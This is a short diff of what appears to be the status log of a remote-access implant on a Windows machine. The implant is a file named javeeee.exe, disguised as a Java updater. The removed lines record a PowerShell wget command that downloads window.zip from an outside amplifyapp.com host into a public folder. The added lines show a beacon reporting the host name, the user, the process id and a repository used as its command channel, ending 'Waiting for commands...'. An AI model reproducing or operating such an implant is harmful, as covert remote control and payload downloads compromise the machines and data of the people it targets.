@@ -1,12 +1,13 @@
-2026-08-28T12:48:28.476173
-
-DESKTOP-9ISASHE / user
-
-C:\
-
-C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
-
-
-
-CMD[1/1] powershell wget https://staging.d1yxos5modoo20.amplifyapp.com/window.zip -o c:\users\public\documents\window.zip
-(no output)
+Java Runtime Helper Online
+time=2026-08-28T13:30:12.9389089
+version=1.0.0
+host=DESKTOP-9ISASHE
+user=afzan
+pid=12860
+path=C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
+admin=false
+ssl=winhttp
+folder=hosts/DESKTOP-9ISASHE_afzan
+repo=duuniversity620/javadtin
+log=C:\Users\afzan\AppData\Local\Temp\javeeee_debug.log
+Waiting for commands...
